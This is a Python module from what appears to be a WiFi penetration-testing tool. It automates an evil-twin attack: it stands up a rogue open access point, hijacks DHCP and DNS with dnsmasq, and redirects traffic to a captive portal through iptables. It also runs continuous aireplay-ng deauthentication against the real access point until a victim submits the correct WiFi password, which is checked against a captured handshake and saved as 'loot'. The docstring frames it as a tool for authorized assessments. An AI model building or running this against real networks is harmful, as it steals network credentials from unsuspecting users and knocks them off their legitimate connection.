"""Evil-twin rogue AP + captive portal for authorized WiFi assessments.

Stands up an open access point broadcasting a scope-authorized SSID (evil twin),
hands out DHCP + hijacks DNS with dnsmasq, redirects HTTP to a generic captive
portal (app.portal), and — optionally — runs a sustained deauth against the REAL
AP so its clients drop and reconnect to the twin. The deauth keeps running until
a client submits the correct Wi-Fi password (verified against a captured
handshake), then stops on its own.

Constraints (see the project's attack guardrails):
  * the SSID (and the deauth BSSID) must be in the engagement scope — enforced by
    the API layer, which also verifies the deauth adapter is in monitor mode
  * single target, generic (non-brand) portal, every start/stop + capture logged
  * the sustained deauth is bound to THIS evil-twin session: it targets only the
    authorized AP's BSSID, and stops when a password is captured or the twin stops
  * uses trusted system tools: hostapd, dnsmasq, iptables, aireplay-ng, aircrack-ng

The AP interface must support AP/master mode; the deauth interface must be a
second adapter in monitor mode. Requires root for hostapd/dnsmasq/iptables/ip/
aireplay-ng.
"""

import subprocess
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from threading import Lock, Thread

from app import loot, procs
from app.portal import has_accepted, portal_command, read_captured, verify_password

GATEWAY_IP = "10.0.0.1"
DHCP_START = "10.0.0.10"
DHCP_END = "10.0.0.100"
# NOT 8080 — that collides with common local services (e.g. Open WebUI), which
# would then answer the captive traffic instead of our portal. iptables redirects
# to whatever this is, so any free port works.
PORTAL_PORT = 5333


class EvilTwinCommandError(Exception):
    pass


def _tail(path: Path, n: int = 3) -> str:
    try:
        lines = [ln for ln in path.read_text(errors="replace").splitlines() if ln.strip()]
        return " ".join(lines[-n:])[:300]
    except OSError:
        return ""


def _validate_ap_params(ssid: str, channel: str) -> None:
    """hostapd.conf is a line-oriented key=value file we build by interpolation. A
    real SSID is up to 32 bytes of arbitrary data (operators often paste it from a
    scan), so a newline or control char in it would inject/break hostapd directives.
    Reject those, enforce the 32-byte SSID limit, and require a numeric channel
    (it's also handed to `iw set channel`)."""
    if not ssid:
        raise EvilTwinCommandError("SSID is required")
    if len(ssid.encode("utf-8")) > 32:
        raise EvilTwinCommandError("SSID is too long (max 32 bytes for an 802.11 SSID)")
    if any(ord(c) < 0x20 or ord(c) == 0x7F for c in ssid):
        raise EvilTwinCommandError("SSID contains a newline or control character — not a valid 802.11 SSID")
    if not str(channel).strip().isdigit():
        raise EvilTwinCommandError(f"Channel must be a number, got '{channel}'")


def build_hostapd_conf(interface: str, ssid: str, channel: str) -> str:
    # Open network (no encryption) — clients associate freely and are funneled
    # to the captive portal. This is the standard evil-twin portal setup.
    return (
        f"interface={interface}\n"
        "driver=nl80211\n"
        f"ssid={ssid}\n"
        "hw_mode=g\n"
        f"channel={channel}\n"
        "auth_algs=1\n"
        "ignore_broadcast_ssid=0\n"
    )


def build_dnsmasq_conf(interface: str, leases_file: str, gateway_ip: str = GATEWAY_IP) -> str:
    # Hand out leases and resolve EVERY domain to the gateway so any HTTP request
    # hits the captive portal (address=/#/ is the dnsmasq catch-all). The
    # leasefile lets us count how many devices have joined the twin.
    return (
        f"interface={interface}\n"
        "bind-interfaces\n"
        "dhcp-authoritative\n"
        f"dhcp-range={DHCP_START},{DHCP_END},255.255.255.0,12h\n"
        f"dhcp-option=3,{gateway_ip}\n"
        f"dhcp-option=6,{gateway_ip}\n"
        f"dhcp-leasefile={leases_file}\n"
        "no-resolv\n"
        f"address=/#/{gateway_ip}\n"
    )


@dataclass
class EvilTwinState:
    running: bool
    interface: str | None
    ssid: str | None
    channel: str | None
    portal_url: str | None
    deauth_running: bool = False
    deauth_target: str | None = None
    deauth_error: str | None = None    # why the deauth stopped/failed, if it did
    verification_active: bool = False  # a usable handshake → wrong passwords are rejected
    password_captured: bool = False    # a correct/accepted password has been submitted
    attempts: int = 0                  # wrong guesses so far
    clients_connected: int = 0         # devices that joined the twin (DHCP leases)
    log: list[str] = field(default_factory=list)  # live event log for the UI
    captured: list[dict] = field(default_factory=list)


class EvilTwinManager:
    def __init__(self) -> None:
        self._lock = Lock()
        self._procs: list[subprocess.Popen] = []
        self._deauth_proc: subprocess.Popen | None = None
        self._hostapd_proc: subprocess.Popen | None = None
        self._interface: str | None = None
        self._ssid: str | None = None
        self._channel: str | None = None
        self._target_bssid: str | None = None
        self._verify: bool = False
        self._pcapng: str = ""
        self._hc22000: str = ""
        self._creds_file: Path | None = None
        self._deauth_log: Path | None = None
        self._leases_file: Path | None = None
        self._tmp_dir: Path | None = None
        self._watch: Thread | None = None
        self._stop_flag = False

    def _run(self, cmd: list[str]) -> None:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        if proc.returncode != 0:
            raise EvilTwinCommandError(f"{' '.join(cmd)} failed: {proc.stderr.strip()}")

    def start(
        self,
        interface: str,
        ssid: str,
        channel: str,
        deauth_interface: str | None = None,
        target_bssid: str | None = None,
        handshake_file: str | None = None,
        hash_file: str | None = None,
    ) -> None:
        with self._lock:
            if any(p.poll() is None for p in self._procs):
                raise RuntimeError("An evil-twin AP is already running")
            _validate_ap_params(ssid, channel)  # reject injection/bad SSID before writing hostapd.conf
            self._procs = []
            self._deauth_proc = None
            self._hostapd_proc = None
            self._deauth_log = None
            self._stop_flag = False
            loot.cleanup(self._tmp_dir)  # clear the PREVIOUS run's config/log temp dir
            tmp = Path(tempfile.mkdtemp(prefix="wifiet_"))
            self._tmp_dir = tmp
            hostapd_conf = tmp / "hostapd.conf"
            dnsmasq_conf = tmp / "dnsmasq.conf"
            self._creds_file = tmp / "captured.jsonl"
            self._leases_file = tmp / "dnsmasq.leases"
            hostapd_conf.write_text(build_hostapd_conf(interface, ssid, channel))
            dnsmasq_conf.write_text(build_dnsmasq_conf(interface, str(self._leases_file)))

            # logs so we can see WHY hostapd/dnsmasq failed (instead of silence)
            hostapd_log = tmp / "hostapd.log"
            dnsmasq_log = tmp / "dnsmasq.log"

            # free the portal port in case a stale portal from a previous run is
            # still bound to it (would otherwise serve the OLD SSID / accept any
            # password). Best-effort.
            subprocess.run(["fuser", "-k", f"{PORTAL_PORT}/tcp"], capture_output=True)

            self._pcapng = handshake_file or ""
            self._hc22000 = hash_file or ""
            # optimistic; the watcher's preflight corrects this once it probes the
            # capture with a bogus password (see _watch_for_capture).
            self._verify = bool(
                target_bssid and (
                    (self._pcapng and Path(self._pcapng).exists())
                    or (self._hc22000 and Path(self._hc22000).exists())
                )
            )

            self._interface = interface
            self._ssid = ssid
            self._channel = channel
            self._target_bssid = target_bssid

            # Start the sustained deauth FIRST — it's independent of the fake AP, so
            # clients begin getting kicked off the real AP immediately, instead of
            # only after the AP + DHCP + portal finish coming up (~4s later, which is
            # why deauth used to "start so late"). aireplay --deauth 0 = continuous,
            # broadcast to ALL clients of that BSSID; stopped on capture or stop().
            if deauth_interface and target_bssid:
                self._start_deauth(deauth_interface, target_bssid, channel)

            try:
                # hostapd FIRST. Switching the card to AP mode RESETS its IP, so
                # assigning the gateway address before hostapd (as we used to) got
                # wiped — clients then associated but got no DHCP/DNS and the portal
                # never opened. Bring the AP up first, THEN set the IP.
                hostapd_fh = open(hostapd_log, "wb")
                self._hostapd_proc = procs.popen(
                    ["sudo", "-n", "hostapd", str(hostapd_conf)],
                    stdout=hostapd_fh, stderr=subprocess.STDOUT)
                self._procs.append(self._hostapd_proc)
                time.sleep(2)  # let the AP come up (and settle the interface)
                if self._hostapd_proc.poll() is not None:
                    detail = _tail(hostapd_log) or "hostapd exited immediately"
                    self._abort_procs(interface)
                    raise EvilTwinCommandError(
                        f"hostapd failed to start the AP on {interface} (channel {channel}). "
                        f"The adapter may not support AP mode on this channel. Details: {detail}"
                    )

                # NOW assign the gateway IP (survives because hostapd is already up)
                self._run(["sudo", "-n", "ip", "addr", "flush", "dev", interface])
                self._run(["sudo", "-n", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", interface])
                self._run(["sudo", "-n", "ip", "link", "set", interface, "up"])

                # redirect inbound HTTP to the captive portal — dedup first so the
                # rule doesn't pile up across runs, then add exactly one.
                self._del_redirect(interface)
                self._run([
                    "sudo", "-n", "iptables", "-t", "nat", "-A", "PREROUTING",
                    "-i", interface, "-p", "tcp", "--dport", "80",
                    "-j", "REDIRECT", "--to-ports", str(PORTAL_PORT),
                ])

                # DHCP + DNS hijack, then the portal
                dnsmasq_fh = open(dnsmasq_log, "wb")
                dnsmasq_proc = procs.popen(
                    ["sudo", "-n", "dnsmasq", "-C", str(dnsmasq_conf), "-d"],
                    stdout=dnsmasq_fh, stderr=subprocess.STDOUT)
                self._procs.append(dnsmasq_proc)
                time.sleep(1)
                if dnsmasq_proc.poll() is not None:
                    detail = _tail(dnsmasq_log) or "dnsmasq exited immediately"
                    self._abort_procs(interface)
                    raise EvilTwinCommandError(
                        f"dnsmasq (DHCP/DNS) failed — clients would connect but get no IP and the portal "
                        f"wouldn't open. Details: {detail}"
                    )
                self._procs.append(procs.popen(
                    portal_command(PORTAL_PORT, self._creds_file, ssid, target_bssid or "", self._pcapng, self._hc22000),
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            except FileNotFoundError as exc:
                self._abort_procs(interface)
                raise EvilTwinCommandError(f"Required tool not found: {exc.filename}") from exc

            # The watcher tears the WHOLE attack down the moment a password is
            # accepted — runs whether or not deauth is on.
            self._watch = Thread(target=self._watch_for_capture, daemon=True)
            self._watch.start()

    def _start_deauth(self, deauth_interface: str, target_bssid: str, channel: str) -> None:
        # park the monitor adapter on the AP's channel first (some drivers don't
        # follow aireplay's own channel handling), then hammer continuously.
        if str(channel).strip():
            subprocess.run(
                ["sudo", "-n", "iw", "dev", deauth_interface, "set", "channel", str(channel).strip()],
                capture_output=True, text=True, timeout=10,
            )
        # keep aireplay's output so we can surface WHY it failed (wrong adapter/no
        # injection, "fixed channel -1", not in monitor mode, …) instead of silence.
        # --ignore-negative-one avoids the common "fixed channel: -1" bail-out.
        self._deauth_log = self._creds_file.parent / "deauth.log" if self._creds_file else None
        log_fh = open(self._deauth_log, "wb") if self._deauth_log else subprocess.DEVNULL
        try:
            self._deauth_proc = procs.popen(
                ["sudo", "-n", "aireplay-ng", "--deauth", "0", "--ignore-negative-one",
                 "-a", target_bssid, deauth_interface],
                stdout=log_fh, stderr=subprocess.STDOUT,
            )
            self._procs.append(self._deauth_proc)
        except FileNotFoundError:
            self._deauth_proc = None  # AP still works; just no auto-deauth

    def _watch_for_capture(self) -> None:
        """Tear the WHOLE attack down the moment the REAL password is verified:
        deauth, fake AP, DNS and portal all stop. A wrong/unverifiable submission
        does NOT stop it. First does a one-off preflight (bogus password) to learn
        whether the capture can actually be used to verify — correcting
        `verification_active` so the UI can warn if it can't."""
        # preflight: bogus password → False means a usable handshake/PMKID exists
        # (so real verification will work); None means we can't verify at all.
        if self._pcapng or self._hc22000:
            probe = verify_password(self._pcapng, self._hc22000, self._target_bssid or "", "__preflight_probe__")
            self._verify = probe is False
        while not self._stop_flag and self.is_running():
            if self._creds_file and has_accepted(self._creds_file):
                time.sleep(2)  # let the client's "You're reconnected" page render first
                self.stop()
                return
            time.sleep(1)

    def _del_redirect(self, interface: str) -> None:
        """Remove ALL matching :80→portal REDIRECT rules — they otherwise pile up
        across runs (one added per start, only one removed per stop)."""
        for _ in range(25):
            r = subprocess.run(
                ["sudo", "-n", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", interface,
                 "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", str(PORTAL_PORT)],
                capture_output=True, text=True,
            )
            if r.returncode != 0:
                break  # no more matching rules

    def _teardown_network(self, interface: str | None) -> None:
        if not interface:
            return
        # best-effort: remove ALL our redirect rules and flush the address
        self._del_redirect(interface)
        subprocess.run(["sudo", "-n", "ip", "addr", "flush", "dev", interface], capture_output=True, text=True)

    def _abort_procs(self, interface: str | None) -> None:
        """Kill everything we spawned (incl. the deauth started first) + undo the
        network changes — used when a startup step fails part-way."""
        for p in self._procs:
            procs.terminate(p)
        self._procs = []
        self._deauth_proc = None
        self._hostapd_proc = None
        self._teardown_network(interface)

    def stop(self) -> None:
        with self._lock:
            self._stop_flag = True
            for p in self._procs:
                procs.terminate(p)  # root-owned (sudo) → killed as root
            self._procs = []
            self._deauth_proc = None
            self._hostapd_proc = None
            self._teardown_network(self._interface)
        # Archive the captured credentials (the loot) to ~/.spectris/loot. COPY,
        # not move: status()/the stop endpoint still read creds right after. The
        # config/log temp dir is cleared on the next start().
        loot.preserve([self._creds_file], "eviltwin-creds")

    def cleanup_tmp(self) -> None:
        """Delete this run's config/log temp dir. Called on shutdown; during a
        session it is kept so status() can read leases/creds after stop(), and is
        cleared on the next start()."""
        loot.cleanup(self._tmp_dir)
        self._tmp_dir = None

    def is_running(self) -> bool:
        # hostapd staying alive is what defines "AP is up". Snapshot the handle:
        # stop() may null it between the None-check and poll().
        p = self._hostapd_proc
        return p is not None and p.poll() is None

    def _deauth_running(self) -> bool:
        p = self._deauth_proc
        return p is not None and p.poll() is None

    def _deauth_error(self) -> str | None:
        """If a deauth was requested but its process died before we captured the
        password, surface the tail of aireplay's output so the operator can see
        WHY (wrong adapter / no injection / not in monitor mode)."""
        if not self._deauth_log or self._deauth_running():
            return None
        if self._creds_file and has_accepted(self._creds_file):
            return None  # stopped because we won, not a failure
        if self._deauth_proc is None:
            return None  # deauth was never requested
        try:
            lines = [ln for ln in self._deauth_log.read_text(errors="replace").splitlines() if ln.strip()]
        except OSError:
            return None
        return " ".join(lines[-3:])[:300] if lines else "deauth process exited unexpectedly"

    def captured(self) -> list[dict]:
        return read_captured(self._creds_file) if self._creds_file else []

    def connected_clients(self) -> int:
        """How many devices have joined the twin, from dnsmasq's DHCP leases —
        one line per lease. Cheap to read on every status poll."""
        if not self._leases_file or not self._leases_file.exists():
            return 0
        try:
            # A real DHCP lease line starts with the expiry epoch (a number):
            # "<epoch> <mac> <ip> <hostname> <clientid>". dnsmasq also writes a
            # leading "duid ..." line when IPv6 is in play — don't count that as a
            # device (it would inflate the client count by one).
            return sum(
                1 for ln in self._leases_file.read_text(errors="replace").splitlines()
                if ln.strip() and ln.split(None, 1)[0].isdigit()
            )
        except OSError:
            return 0

    def _build_log(self, creds: list[dict], clients: int) -> list[str]:
        """Synthesized live event log for the UI — what the twin is doing right now."""
        log: list[str] = []
        if self.is_running():
            log.append(f"[ap] broadcasting '{self._ssid}' on channel {self._channel} via {self._interface}")
            log.append(f"[portal] captive portal live at http://{GATEWAY_IP}/ (port {PORTAL_PORT})")
        if self._target_bssid:
            if self._deauth_running():
                log.append(f"[deauth] continuously kicking clients off {self._target_bssid}")
            elif any(r.get("verified") is True for r in creds):
                log.append("[deauth] stopped — correct Wi-Fi password captured ✔")
            elif self._deauth_error():
                log.append(f"[deauth] not running: {self._deauth_error()}")
        log.append(f"[clients] {clients} device(s) connected to the twin")
        for r in creds:
            v = r.get("verified")
            ip = r.get("client", "?")
            pw = r.get("fields", {}).get("password", "")
            tag = "CORRECT ✔" if v is True else ("wrong ✗" if v is False else "captured (unverified)")
            ts = str(r.get("timestamp", ""))[11:19]
            log.append(f"[portal {ts}] {ip} tried '{pw}' → {tag}")
        # tail of aireplay's own output (packets sent / errors)
        if self._deauth_log and self._deauth_log.exists():
            try:
                tail = [ln for ln in self._deauth_log.read_text(errors="replace").splitlines() if ln.strip()][-4:]
                log += [f"[aireplay] {ln}" for ln in tail]
            except OSError:
                pass
        return log

    def status(self) -> EvilTwinState:
        creds = self.captured()
        clients = self.connected_clients()
        return EvilTwinState(
            running=self.is_running(),
            interface=self._interface,
            ssid=self._ssid,
            channel=self._channel,
            portal_url=f"http://{GATEWAY_IP}/" if self.is_running() else None,
            deauth_running=self._deauth_running(),
            deauth_target=self._target_bssid,
            deauth_error=self._deauth_error(),
            verification_active=self._verify,
            password_captured=any(r.get("verified") is True for r in creds),
            attempts=sum(1 for r in creds if r.get("verified") is False),
            clients_connected=clients,
            log=self._build_log(creds, clients),
            captured=creds,
        )

eviltwin_manager = EvilTwinManager()
